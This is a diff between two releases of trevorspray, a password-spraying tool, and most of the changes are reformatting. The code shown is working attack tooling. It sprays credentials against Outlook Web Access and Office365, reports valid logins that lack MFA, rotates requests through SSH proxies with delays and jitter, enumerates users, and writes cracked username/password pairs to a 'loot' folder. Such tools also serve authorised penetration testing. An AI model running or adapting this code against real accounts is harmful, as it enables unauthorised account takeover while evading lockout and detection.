         self.url = self.url.format(**self.trevor.runtimeparams)
 
         return True
 
     def check_response(self, response):
-
         valid = False
         exists = None
         locked = None
-        msg = ''
+        msg = ""
 
         json = {}
         with suppress(Exception):
             json = response.json()
 
-        status = json.get('status', json.get('errorSummary', 'Unknown'))
-        status_code = getattr(response, 'status_code', 0)
-        msg = f'[{status}] (Response code {status_code})'
+        status = json.get("status", json.get("errorSummary", "Unknown"))
+        status_code = getattr(response, "status_code", 0)
+        msg = f"[{status}] (Response code {status_code})"
 
-        if status_code == 200 and 'status' in json:
-            if status == 'LOCKED_OUT':
+        if status_code == 200 and "status" in json:
+            if status == "LOCKED_OUT":
                 locked = True
             else:
                 exists = True
                 valid = True
-                if status == 'MFA_ENROLL':
-                    msg = f'[{status}] Valid credentials without MFA!\n{highlight_json(json)}'
+                if status == "MFA_ENROLL":
+                    msg = f"[{status}] Valid credentials without MFA!\n{highlight_json(json)}"
                 else:
-                    msg = f'[{status}] Valid credentials!\n{highlight_json(json)}'
+                    msg = f"[{status}] Valid credentials!\n{highlight_json(json)}"
 
         return (valid, exists, locked, msg)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/owa.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/owa.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,88 +1,97 @@
 import logging
 from ..util import ntlmdecode
 from .base import BaseSprayModule
 from tldextract import tldextract
 from requests_ntlm import HttpNtlmAuth
 
-log = logging.getLogger('trevorspray.sprayers.owa')
+log = logging.getLogger("trevorspray.sprayers.owa")
 
-class OWA(BaseSprayModule):
 
+class OWA(BaseSprayModule):
     # HTTP method
-    method = 'GET'
+    method = "GET"
     # default target URL
-    default_url = 'none'
+    default_url = "none"
     # HTTP headers
-    headers = {
-        "Content-Type": "text/xml"
-    }
+    headers = {"Content-Type": "text/xml"}
 
     def initialize(self):
-
-        log.warning('NOTE: OWA typically uses the INTERNAL username format! Often this is different than the email format.')
-        log.warning('This means your --usernames file should probably contain INTERNAL usernames')
-        log.warning('Depending on the OWA instance, the usernames may also need the domain like so: "CORP.LOCAL\\USERNAME"')
-        log.warning('You can discover the OWA\'s internal domain with --recon')
-        log.warning('If this isn\'t what you want, consider spraying with the "msol" or "adfs" module instead.')
+        log.warning(
+            "NOTE: OWA typically uses the INTERNAL username format! Often this is different than the email format."
+        )
+        log.warning(
+            "This means your --usernames file should probably contain INTERNAL usernames"
+        )
+        log.warning(
+            'Depending on the OWA instance, the usernames may also need the domain like so: "CORP.LOCAL\\USERNAME"'
+        )
+        log.warning("You can discover the OWA's internal domain with --recon")
+        log.warning(
+            'If this isn\'t what you want, consider spraying with the "msol" or "adfs" module instead.'
+        )
 
         self.o365 = False
-        if self.url != 'none':
+        if self.url != "none":
             self.domain = str(tldextract.extract(self.url).fqdn)
         else:
-            log.warning('No --url specified, autodetecting')
+            log.warning("No --url specified, autodetecting")
             if self.trevor.domain:
                 self.domain = str(self.trevor.domain)
                 log.info(f'Using domain "{self.trevor.domain}"')
                 discovery = self.trevor.discovery(self.trevor.domain)
-                self.url = discovery.autodiscover().get('Url', 'none')
+                self.url = discovery.autodiscover().get("Url", "none")
             else:
-                self.domain = 'office365.com'
+                self.domain = "office365.com"
         discovery = self.trevor.discovery(self.domain)
 
-        if self.url == 'none':
-            self.url = 'https://outlook.office365.com/autodiscover/autodiscover.xml'
-            log.warning(f'Failed to autodetect URL. Falling back to {self.url}')
+        if self.url == "none":
+            self.url = "https://outlook.office365.com/autodiscover/autodiscover.xml"
+            log.warning(f"Failed to autodetect URL. Falling back to {self.url}")
 
         extracted = tldextract.extract(self.url)
-        if f'{extracted.domain}.{extracted.suffix}'.lower() in ['outlook.com', 'office365.com']:
-            log.warning('NOTE: You are spraying O365. Please manually specify a --url if this is not what you want.')
+        if f"{extracted.domain}.{extracted.suffix}".lower() in [
+            "outlook.com",
+            "office365.com",
+        ]:
+            log.warning(
+                "NOTE: You are spraying O365. Please manually specify a --url if this is not what you want."
+            )
             self.o365 = True
 
-        log.info(f'Using OWA URL: {self.url}')
+        log.info(f"Using OWA URL: {self.url}")
         if not self.o365:
             discovery.owa_internal_domain(self.url)
 
         return True
 
-
     def create_request(self, username, password):
-        '''
+        """
         Returns request.Request() object
-        '''
+        """
 
         r = super().create_request(username, password)
         if self.o365:
             r.auth = (username, password)
         else:
             r.auth = HttpNtlmAuth(username, password)
         return r
 
-
     def check_response(self, response):
-
         exists = False
         valid = False
         locked = False
 
-        response_length = len(getattr(response, 'content', ''))
-        msg = f'[{response}] (Length: {response_length})'
+        response_length = len(getattr(response, "content", ""))
+        msg = f"[{response}] (Length: {response_length})"
 
-        response_code = getattr(response, 'status_code', 0)
+        response_code = getattr(response, "status_code", 0)
         if response_code in [200, 456]:
             exists = True
             valid = True
-            msg = 'Valid credential!'
+            msg = "Valid credential!"
         if response_code == 456:
-            msg += ' But login failed, please check manually (MFA, account locked, etc.)'
+            msg += (
+                " But login failed, please check manually (MFA, account locked, etc.)"
+            )
 
         return (valid, exists, locked, msg)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/trevor.py` & `trevorspray-2.0.8/trevorspray/lib/trevor.py`

 * *Files 15% similar despite different names*

```diff
@@ -5,235 +5,240 @@
 import threading
 from . import util
 from . import sprayers
 from pathlib import Path
 from . import enumerators
 from contextlib import suppress
 from tldextract import tldextract
+from .errors import TREVORSprayError
 from .discover import DomainDiscovery
 from .proxy import ProxyThread, SubnetThread
 
-log = logging.getLogger('trevorspray.sprayer')
+log = logging.getLogger("trevorspray.sprayer")
 
 
 class TrevorSpray:
-
-    env_keyword = 'TREVOR_'
+    env_keyword = "TREVOR_"
 
     def __init__(self, options):
-
         self.options = options
         self.runtimeparams = dict(self.env)
 
         self.lockout_counter = 0
         self.lockout_question = False
 
         self.sprayed_counter = 0
-        self.sprayed_possible = max(1, len(self.options.users)) * max(1, len(self.options.passwords))
+        self.sprayed_possible = max(1, len(self.options.users)) * max(
+            1, len(self.options.passwords)
+        )
 
-        self.home = Path.home() / '.trevorspray'
+        self.home = Path.home() / ".trevorspray"
         self.home.mkdir(exist_ok=True)
-        self.loot_dir = self.home / 'loot'
+        self.loot_dir = self.home / "loot"
         self.loot_dir.mkdir(exist_ok=True)
 
         self._discovery = {}
         self._domain = None
 
         self.proxies = []
         if options.ssh:
             threads = options.ssh + ([] if options.no_current_ip else [None])
         elif options.subnet:
-            threads = ['<subnet>'] * options.threads
+            threads = ["<subnet>"] * options.threads
         else:
             threads = [None] * options.threads
 
         self.subnet_proxy = None
         if options.subnet:
-            self.subnet_proxy = SubnetThread(
-                trevor=self,
-                daemon=True
-            )
+            self.subnet_proxy = SubnetThread(trevor=self, daemon=True)
             self.subnet_proxy.start()
 
-        initial_delay_increment = (options.delay + (options.jitter / 2)) / max(1, len(options.ssh))
-        for i,ssh_host in enumerate(threads):
+        initial_delay_increment = (options.delay + (options.jitter / 2)) / max(
+            1, len(options.ssh)
+        )
+        for i, ssh_host in enumerate(threads):
             proxy = ProxyThread(
                 trevor=self,
                 host=ssh_host,
-                proxy_port=options.base_port+i,
-                daemon=True
+                proxy_port=options.base_port + i,
+                daemon=True,
             )
             if options.ssh or options.threads:
                 proxy.initial_delay = initial_delay_increment * i
             self.proxies.append(proxy)
 
         self.user_enum = False
         self.user_enumerator = None
         if self.options.users and self.options.recon:
-            log.info(f'User enumeration enabled with --recon and --users')
+            log.info(f"User enumeration enabled with --recon and --users")
             self.user_enum = True
             choices = list(enumerators.module_choices.keys())
-            choice = self.runtimeparams.get('userenum_method', '')
+            choice = self.runtimeparams.get("userenum_method", "")
             while not choice:
-                log.info(f'Choosing user enumeration method (skip by exporting TREVOR_userenum_method={"|".join(choices)})')
-                choice = input(f'\n[USER] Which user enumeration method would you like to use? ({"|".join(choices)}) ')
+                log.info(
+                    f'Choosing user enumeration method (skip by exporting TREVOR_userenum_method={"|".join(choices)})'
+                )
+                choice = input(
+                    f'\n[USER] Which user enumeration method would you like to use? ({"|".join(choices)}) '
+                )
                 if choice not in choices:
                     log.error(f'Invalid selection, "{choice}"')
-                    choice = ''
+                    choice = ""
                     continue
-            self.runtimeparams.update({'userenum_method': str(choice)})
+            self.runtimeparams.update({"userenum_method": str(choice)})
             self.user_enumerator = enumerators.module_choices[choice](trevor=self)
 
         sprayer_class = sprayers.module_choices.get(options.module, None)
         if sprayer_class is not None:
             self.sprayer = sprayer_class(trevor=self)
+        else:
+            raise TREVORSprayError(f'Failed to load sprayer "{options.module}"')
 
-        self.existent_users_file = str(self.home / 'existent_users.txt')
-        self.valid_logins_file = str(self.home / 'valid_logins.txt')
-        self.tried_logins_file = str(self.home / 'tried_logins.txt')
+        self.existent_users_file = str(self.home / "existent_users.txt")
+        self.valid_logins_file = str(self.home / "valid_logins.txt")
+        self.tried_logins_file = str(self.home / "tried_logins.txt")
         self.existent_users = []
         self.valid_logins = []
         self.tried_logins = util.read_file(
-            self.tried_logins_file,
-            key=lambda x: x.startswith(f'{self.sprayer.id}')
+            self.tried_logins_file, key=lambda x: x.startswith(f"{self.sprayer.id}")
         )
 
         self.lock = threading.Lock()
         self._stop = False
         self.stopping = False
 
-
     def go(self):
-
         try:
-
             self.start()
 
             if self.options.recon:
                 discovery = self.discovery(self.options.recon)
                 discovery.recon()
 
             if self.options.users:
                 # user enumeration
                 if self.options.recon:
-                    log.info(f'Enumerating {len(self.options.users):,} users against {self.user_enumerator.url} at {time.ctime()}')
+                    log.info(
+                        f"Enumerating {len(self.options.users):,} users against {self.user_enumerator.url} at {time.ctime()}"
+                    )
                     self.spray(enumerate_users=True)
-                    log.info(f'Enumerated {len(self.existent_users):,} valid users against {self.user_enumerator.url} at {time.ctime()}')
+                    log.info(
+                        f"Enumerated {len(self.existent_users):,} valid users against {self.user_enumerator.url} at {time.ctime()}"
+                    )
                     self.options.users = list(self.existent_users)
 
                 # password spray
                 if self.options.passwords:
-                    log.info(f'Spraying {len(self.options.users):,} users * {len(self.options.passwords):,} passwords against {self.sprayer.url} at {time.ctime()}')
+                    log.info(
+                        f"Spraying {len(self.options.users):,} users * {len(self.options.passwords):,} passwords against {self.sprayer.url} at {time.ctime()}"
+                    )
                     self.spray()
-                    log.info(f'Finished spraying {self.sprayed_counter:,} users against {self.sprayer.url} at {time.ctime()}')
+                    log.info(
+                        f"Finished spraying {self.sprayed_counter:,} users against {self.sprayer.url} at {time.ctime()}"
+                    )
                     for success in self.valid_logins:
                         log.success(success)
         finally:
             self.stop()
 
-
     def spray(self, enumerate_users=False):
-
         if enumerate_users:
             sprayer = self.user_enumerator
         else:
             sprayer = self.sprayer
 
         ready = False
         try:
             ready = sprayer.initialize()
         except Exception as e:
-            log.error(f'Unhandled error in {sprayer.__class__.__name__}.initialize(): {e}')
+            log.error(
+                f"Unhandled error in {sprayer.__class__.__name__}.initialize(): {e}"
+            )
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
 
         if not ready:
-            log.error(f'Failed to initialize {sprayer.__class__.__name__}')
+            log.error(f"Failed to initialize {sprayer.__class__.__name__}")
             return
 
-        for password in ([None] if enumerate_users else self.options.passwords):
+        for password in [None] if enumerate_users else self.options.passwords:
             for user in self.options.users:
                 accepted = False
                 while not accepted and not self._stop:
                     for proxy in self.proxies:
                         accepted = proxy.submit(user, password, enumerate_users)
                         if accepted:
                             break
-                        
+
                     if not accepted:
-                        time.sleep(.1)
+                        time.sleep(0.1)
 
         # wait until finished
         self.stopping = True
         while not self.finished:
-            log.verbose('Waiting for proxy threads to finish')
+            log.verbose("Waiting for proxy threads to finish")
             time.sleep(2)
 
-
     def start(self):
-
         for proxy in self.proxies:
             if proxy is not None:
                 proxy.start()
 
     def stop(self):
-
-        log.debug('Stopping sprayer')
+        log.debug("Stopping sprayer")
         self.stopping = True
         self._stop = True
         for proxy in self.proxies:
             if proxy is not None:
                 proxy.stop()
         with suppress(Exception):
             self.subnet_proxy.stop()
         # write valid users
         util.update_file(self.existent_users_file, self.existent_users)
-        log.info(f'{len(self.existent_users):,} valid users written to {self.existent_users_file}')
+        log.info(
+            f"{len(self.existent_users):,} valid users written to {self.existent_users_file}"
+        )
         # write attempted logins
         util.update_file(self.tried_logins_file, self.tried_logins)
         # write valid logins
         util.update_file(self.valid_logins_file, self.valid_logins)
-        log.info(f'{len(self.valid_logins):,} valid user/pass combos written to {self.valid_logins_file}')
-
+        log.info(
+            f"{len(self.valid_logins):,} valid user/pass combos written to {self.valid_logins_file}"
+        )
 
     @property
     def finished(self):
-
         return all([not proxy.running for proxy in self.proxies])
 
-
     def discovery(self, domain):
-
         try:
             domain = tldextract.extract(domain).fqdn
         except Exception:
             return None
         if not domain in self._discovery:
             self._discovery[domain] = DomainDiscovery(self, domain)
         return self._discovery[domain]
 
-
     @property
     def env(self):
         env = dict()
         # enumerate environment variables
-        for k,v in os.environ.items():
+        for k, v in os.environ.items():
             if k.startswith(self.env_keyword):
                 _k = k.split(self.env_keyword)[-1]
                 env[_k] = v
         return env
 
-
     @property
     def domain(self):
-
         if self._domain is None:
             if self.options.recon:
                 self._domain = str(self.options.recon)
             elif self.options.users:
                 for user in self.options.users:
-                    if '@' in user:
-                        self._domain = self.options.users[0].split('@')[-1].lower()
+                    if "@" in user:
+                        self._domain = self.options.users[0].split("@")[-1].lower()
                         break
 
-        return self._domain
+        return self._domain
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/__pycache__/misc.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/util/__pycache__/misc.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/__pycache__/misc.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/util/__pycache__/misc.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/__pycache__/threading.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/util/__pycache__/threading.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/__pycache__/threadpool.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/util/__pycache__/threadpool.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/__pycache__/threadpool.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/util/__pycache__/threadpool.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/misc.py` & `trevorspray-2.0.8/trevorspray/lib/util/misc.py`

 * *Files 8% similar despite different names*

```diff
@@ -10,199 +10,193 @@
 from contextlib import suppress
 from urllib.parse import urlparse
 from pygments.lexers.html import XmlLexer
 from pygments.lexers.data import JsonLexer
 from requests.exceptions import RequestException
 from pygments.formatters import TerminalFormatter
 
-log = logging.getLogger('trevorspray.util.misc')
+log = logging.getLogger("trevorspray.util.misc")
 
 
-windows_user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+windows_user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
 
 
 def highlight_json(j):
-
     if type(j) in [dict, list, set, tuple]:
         j = json.dumps(j, indent=4)
 
     return highlight(j, JsonLexer(), TerminalFormatter())
 
 
 def highlight_xml(x):
-
     if type(x) == str:
         x = str.encode()
 
     with suppress(Exception):
         x = etree.tostring(etree.fromstring(x), pretty_print=True)
 
     return highlight(x, XmlLexer(), TerminalFormatter())
 
 
 def files_to_list(l):
-
     new_list = dict()
     for entry in l:
         entry = str(entry)
         try:
-            with open(entry, errors='ignore') as f:
+            with open(entry, errors="ignore") as f:
                 for line in f.readlines():
-                    entry = line.strip('\r\n').lower()
+                    entry = line.strip("\r\n").lower()
                     new_list[entry] = True
         except OSError:
             if entry and entry not in new_list:
                 new_list[entry] = True
 
     return new_list
 
 
 def update_file(filename, l):
-    '''
+    """
     Update file "filename" with entries from list "l"
     Only unique entries are added
-    '''
+    """
 
     final_list = dict()
     try:
         with open(str(filename)) as f:
             for line in f:
                 final_list[line.strip()] = True
     except OSError as e:
-        log.debug(f'Could not read file {filename}: {e}')
+        log.debug(f"Could not read file {filename}: {e}")
     for entry in l:
         final_list[entry] = True
-    with open(filename, 'w') as f:
-        f.writelines([f'{e}\n' for e in final_list])
+    with open(filename, "w") as f:
+        f.writelines([f"{e}\n" for e in final_list])
 
 
 def read_file(filename, key=lambda x: True):
-
     final_list = dict()
     try:
         with open(str(filename)) as f:
             for line in f.readlines():
                 entry = line.strip()
                 if key(entry):
                     final_list[entry] = True
     except OSError as e:
-        log.debug(f'Could not read file {filename}: {e}')
+        log.debug(f"Could not read file {filename}: {e}")
 
     return final_list
 
 
 def ssh_key_encrypted(f=None):
-
     if f is None:
-        f = Path.home() / '.ssh/id_rsa'
+        f = Path.home() / ".ssh/id_rsa"
 
     try:
-        p = sp.run(['ssh-keygen', '-y', '-P', '', '-f', str(f)], stdout=sp.DEVNULL, stderr=sp.PIPE)
-        if not 'incorrect' in p.stderr.decode():
+        p = sp.run(
+            ["ssh-keygen", "-y", "-P", "", "-f", str(f)],
+            stdout=sp.DEVNULL,
+            stderr=sp.PIPE,
+        )
+        if not "incorrect" in p.stderr.decode():
             return False
     except:
         pass
     return True
 
 
 def is_domain(d):
-
     extracted = tldextract.extract(d)
     if extracted.domain and not extracted.subdomain:
         return True
     return False
 
 
 def is_subdomain(d):
-
     extracted = tldextract.extract(d)
     if extracted.domain and extracted.subdomain:
         return True
     return False
 
 
 def is_url(d):
-
     parsed = urlparse(d)
-    if parsed.scheme or '/' in parsed.path or parsed.query:
+    if parsed.scheme or "/" in parsed.path or parsed.query:
         return True
     return False
 
 
 def download_file(url, filename, **kwargs):
-
-    log.debug(f'Downloading file from {url} to {filename}, {kwargs}')
-    with request('GET', url, stream=True, **kwargs) as response:
-        text = getattr(response, 'text', '')
-        status_code = getattr(response, 'status_code', 0)
-        log.debug(f'Download result: HTTP {status_code}, Size: {len(text)}')
+    log.debug(f"Downloading file from {url} to {filename}, {kwargs}")
+    with request("GET", url, stream=True, **kwargs) as response:
+        text = getattr(response, "text", "")
+        status_code = getattr(response, "status_code", 0)
+        log.debug(f"Download result: HTTP {status_code}, Size: {len(text)}")
         if status_code != 0:
             response.raise_for_status()
-            with open(filename, 'wb') as f:
-                for chunk in response.iter_content(chunk_size=8192):  
+            with open(filename, "wb") as f:
+                for chunk in response.iter_content(chunk_size=8192):
                     f.write(chunk)
 
 
 def request(*args, **kwargs):
-
-    retries = kwargs.pop('retries', 3)
-    session = kwargs.pop('session', None)
+    retries = kwargs.pop("retries", 3)
+    session = kwargs.pop("session", None)
 
     prepared = False
     if len(args) > 1:
         url = args[1]
     elif len(args) == 1:
         url = args[0]
         if type(url) == requests.models.PreparedRequest:
             prepared = url
             url = str(url.url)
     else:
-        url = kwargs.get('url', '')
+        url = kwargs.get("url", "")
 
-    if not prepared and not args and 'method' not in kwargs:
-        kwargs['method'] = 'GET'
+    if not prepared and not args and "method" not in kwargs:
+        kwargs["method"] = "GET"
 
-    if not 'timeout' in kwargs:
-        kwargs['timeout'] = 10
+    if not "timeout" in kwargs:
+        kwargs["timeout"] = 10
 
     if prepared:
         headers = prepared.headers
     else:
-        headers = kwargs.get('headers', {})
+        headers = kwargs.get("headers", {})
 
-    if 'User-Agent' not in headers:
-        headers.update({
-            'User-Agent': windows_user_agent
-        })
+    if "User-Agent" not in headers:
+        headers.update({"User-Agent": windows_user_agent})
     if prepared:
         prepared.headers = headers
     else:
-        kwargs['headers'] = headers
+        kwargs["headers"] = headers
 
-    if not 'verify' in kwargs:
-        kwargs['verify'] = False
+    if not "verify" in kwargs:
+        kwargs["verify"] = False
 
-    while retries == 'infinite' or retries >= 0:
+    while retries == "infinite" or retries >= 0:
         try:
             if prepared:
-                logstr = f'Web Request: {prepared.method} {prepared.url} {prepared.headers}, {str(kwargs)}'
+                logstr = f"Web Request: {prepared.method} {prepared.url} {prepared.headers}, {str(kwargs)}"
             else:
-                logstr = f'Web request: {str(args)}, {str(kwargs)}'
+                logstr = f"Web request: {str(args)}, {str(kwargs)}"
             log.debug(logstr)
             if session is not None:
                 if prepared:
                     response = session.send(*args, **kwargs)
                 else:
                     response = session.request(*args, **kwargs)
             else:
                 response = requests.request(*args, **kwargs)
-            log.debug(f'Web response: {response} (Length: {len(response.content)}) headers: {response.headers}')
+            log.debug(
+                f"Web response: {response} (Length: {len(response.content)}) headers: {response.headers}"
+            )
             return response
         except RequestException as e:
-            log.debug(f'Web error: {e}')
-            if retries != 'infinite':
+            log.debug(f"Web error: {e}")
+            if retries != "infinite":
                 retries -= 1
-            if retries == 'infinite' or retries >= 0:
+            if retries == "infinite" or retries >= 0:
                 log.warning(f'Error requesting "{url}", retrying...')
                 sleep(2)
             else:
-                return e
+                return e
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/ntlmdecoder.py` & `trevorspray-2.0.8/trevorspray/lib/util/ntlmdecoder.py`

 * *Files 6% similar despite different names*

```diff
@@ -8,15 +8,15 @@
 ## Based on the excellent protocol description from:
 ##  <http://davenport.sourceforge.net/ntlm.html>
 ## with additional detail subsequently added from the official protocol spec:
 ##  <http://msdn.microsoft.com/en-us/library/cc236621.aspx>
 ##
 ## For example:
 ##
-##   $ echo "TlRMTVNTUAABAAAABYIIAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAwAAAA" | ./ntlmdecoder.py 
+##   $ echo "TlRMTVNTUAABAAAABYIIAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAwAAAA" | ./ntlmdecoder.py
 ##   Found NTLMSSP header
 ##   Msg Type: 1 (Request)
 ##   Domain: '' [] (0b @0)
 ##   Workstation: '' [] (0b @0)
 ##   OS Ver: '????0???'
 ##   Flags: 0x88205 ["Negotiate Unicode", "Request Target", "Negotiate NTLM", "Negotiate Always Sign", "Negotiate NTLM2 Key"]
 ##
@@ -24,15 +24,15 @@
 import base64
 import struct
 import string
 import collections
 import logging
 from binascii import hexlify
 
-log = logging.getLogger('trevorspray.util.ntlmdecoder')
+log = logging.getLogger("trevorspray.util.ntlmdecoder")
 
 flags_tbl_str = """0x00000001  Negotiate Unicode
 0x00000002  Negotiate OEM
 0x00000004  Request Target
 0x00000008  unknown
 0x00000010  Negotiate Sign
 0x00000020  Negotiate Seal
@@ -59,51 +59,54 @@
 0x04000000  unknown
 0x08000000  unknown
 0x10000000  unknown
 0x20000000  Negotiate 128
 0x40000000  Negotiate Key Exchange
 0x80000000  Negotiate 56"""
 
-flags_tbl = [line.split('  ') for line in flags_tbl_str.split('\n')]
+flags_tbl = [line.split("  ") for line in flags_tbl_str.split("\n")]
 flags_tbl = [(int(x, base=16), y) for x, y in flags_tbl]
 VALID_CHRS = set(string.ascii_letters + string.digits + string.punctuation)
 
 
 def flags_lst(flags):
     return [desc for val, desc in flags_tbl if val & flags]
 
 
 def flags_str(flags):
-    return ', '.join('"%s"' % s for s in flags_lst(flags))
+    return ", ".join('"%s"' % s for s in flags_lst(flags))
 
 
 def clean_str(st):
-    return ''.join((s if s in VALID_CHRS else '?') for s in st)
+    return "".join((s if s in VALID_CHRS else "?") for s in st)
 
 
 class StrStruct(object):
     def __init__(self, pos_tup, raw):
         length, alloc, offset = pos_tup
         self.length = length
         self.alloc = alloc
         self.offset = offset
-        self.raw = raw[offset:offset + length]
+        self.raw = raw[offset : offset + length]
         self.utf16 = False
 
-        if len(self.raw) >= 2 and self.raw[1] == '\0':
-            self.string = self.raw.decode('utf-16')
+        if len(self.raw) >= 2 and self.raw[1] == "\0":
+            self.string = self.raw.decode("utf-16")
             self.utf16 = True
         else:
             self.string = self.raw
 
     def __str__(self):
-        st = "%s'%s' [%s] (%db @%d)" % ('u' if self.utf16 else '',
-                                        clean_str(self.string),
-                                        hexlify(self.raw),
-                                        self.length, self.offset)
+        st = "%s'%s' [%s] (%db @%d)" % (
+            "u" if self.utf16 else "",
+            clean_str(self.string),
+            hexlify(self.raw),
+            self.length,
+            self.offset,
+        )
         if self.alloc != self.length:
             st += " alloc: %d" % self.alloc
         return st
 
 
 msg_types = collections.defaultdict(lambda: "UNKNOWN")
 msg_types[1] = "Request"
@@ -117,24 +120,24 @@
 target_field_types[3] = "FQDN"
 target_field_types[4] = "DNS_Domain_name"
 target_field_types[5] = "DNS_Tree_Name"
 target_field_types[7] = "Timestamp"
 
 
 def opt_str_struct(name, st, offset):
-    nxt = st[offset:offset + 8]
+    nxt = st[offset : offset + 8]
     if len(nxt) == 8:
         hdr_tup = struct.unpack("<hhi", nxt)
         print("%s: %s" % (name, StrStruct(hdr_tup, st)))
     else:
         print("%s: [omitted]" % name)
 
 
 def opt_inline_str(name, st, offset, sz):
-    nxt = st[offset:offset + sz]
+    nxt = st[offset : offset + sz]
     if len(nxt) == sz:
         print("%s: '%s'" % (name, clean_str(nxt)))
     else:
         print("%s: [omitted]" % name)
 
 
 def pretty_print_request(st):
@@ -150,51 +153,51 @@
 
 
 def pretty_print_challenge(st):
     hdr_tup = struct.unpack("<hhiiQ", st[12:32])
 
     parsed_challange = {}
 
-    #print("Target Name: %s" % StrStruct(hdr_tup[0:3], st))
-    #print("Challenge: 0x%x" % hdr_tup[4])
+    # print("Target Name: %s" % StrStruct(hdr_tup[0:3], st))
+    # print("Challenge: 0x%x" % hdr_tup[4])
 
     flags = hdr_tup[3]
 
-    #opt_str_struct("Context", st, 32)
+    # opt_str_struct("Context", st, 32)
 
     nxt = st[40:48]
     if len(nxt) == 8:
         hdr_tup = struct.unpack("<hhi", nxt)
         tgt = StrStruct(hdr_tup, st)
 
         output = "Target: [block] (%db @%d)" % (tgt.length, tgt.offset)
         if tgt.alloc != tgt.length:
             output += " alloc: %d" % tgt.alloc
-        #print(output)
+        # print(output)
 
         raw = tgt.raw
         pos = 0
 
         while pos + 4 < len(raw):
-            rec_hdr = struct.unpack("<hh", raw[pos: pos + 4])
+            rec_hdr = struct.unpack("<hh", raw[pos : pos + 4])
             rec_type_id = rec_hdr[0]
             rec_type = target_field_types[rec_type_id]
             rec_sz = rec_hdr[1]
-            subst = raw[pos + 4: pos + 4 + rec_sz]
+            subst = raw[pos + 4 : pos + 4 + rec_sz]
             try:
-                parsed_challange[rec_type] = subst.replace(b'\x00', b'').decode()
-                #print("    %s (%d): %s" % (rec_type, rec_type_id, subst.replace(b'\x00', b'').decode()))
+                parsed_challange[rec_type] = subst.replace(b"\x00", b"").decode()
+                # print("    %s (%d): %s" % (rec_type, rec_type_id, subst.replace(b'\x00', b'').decode()))
             except UnicodeDecodeError:
-                parsed_challange[rec_type] = subst.replace(b'\x00', b'')
-                #print("    %s (%d): %s" % (rec_type, rec_type_id, subst.replace(b'\x00', b'')))
+                parsed_challange[rec_type] = subst.replace(b"\x00", b"")
+                # print("    %s (%d): %s" % (rec_type, rec_type_id, subst.replace(b'\x00', b'')))
             pos += 4 + rec_sz
 
-    #opt_inline_str("OS Ver", st, 48, 8)
+    # opt_inline_str("OS Ver", st, 48, 8)
 
-    #print("Flags: 0x%x [%s]" % (flags, flags_str(flags)))
+    # print("Flags: 0x%x [%s]" % (flags, flags_str(flags)))
     return parsed_challange
 
 
 def pretty_print_response(st):
     hdr_tup = struct.unpack("<hhihhihhihhihhi", st[12:52])
 
     print("LM Resp: %s" % StrStruct(hdr_tup[0:3], st))
@@ -212,27 +215,31 @@
         flags = flg_tup[0]
         print("Flags: 0x%x [%s]" % (flags, flags_str(flags)))
     else:
         print("Flags: [omitted]")
 
 
 def ntlmdecode(authenticate_header):
-    _, st_raw = authenticate_header.split(',')[0].split()
+    _, st_raw = authenticate_header.split(",")[0].split()
     try:
         st = base64.b64decode(st_raw)
     except Exception as e:
-        raise Exception(f"Input seems to be a non-valid base64-encoded string: '{authenticate_header}'")
+        raise Exception(
+            f"Input seems to be a non-valid base64-encoded string: '{authenticate_header}'"
+        )
 
-    if not st[:8] == b'NTLMSSP\x00':
+    if not st[:8] == b"NTLMSSP\x00":
         raise Exception("NTLMSSP header not found at start of input string")
 
     ver_tup = struct.unpack("<i", st[8:12])
     ver = ver_tup[0]
 
-    #print("Msg Type: %d (%s)" % (ver, msg_types[ver]))
+    # print("Msg Type: %d (%s)" % (ver, msg_types[ver]))
 
-    #if ver == 1:
-        #pretty_print_request(st)
+    # if ver == 1:
+    # pretty_print_request(st)
 
     return pretty_print_challenge(st)
 
-    raise Exception(f"Unknown message structure.  Have a raw (hex-encoded) message: {hexlify(st)}")
+    raise Exception(
+        f"Unknown message structure.  Have a raw (hex-encoded) message: {hexlify(st)}"
+    )
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/util/threadpool.py` & `trevorspray-2.0.8/trevorspray/lib/util/threadpool.py`

 * *Files 5% similar despite different names*

```diff
@@ -1,101 +1,93 @@
 import queue
 import logging
 import threading
 from time import sleep
 from contextlib import suppress
 
-log = logging.getLogger('trevorspray.util.threadpool')
+log = logging.getLogger("trevorspray.util.threadpool")
 
-class ThreadPool:
-
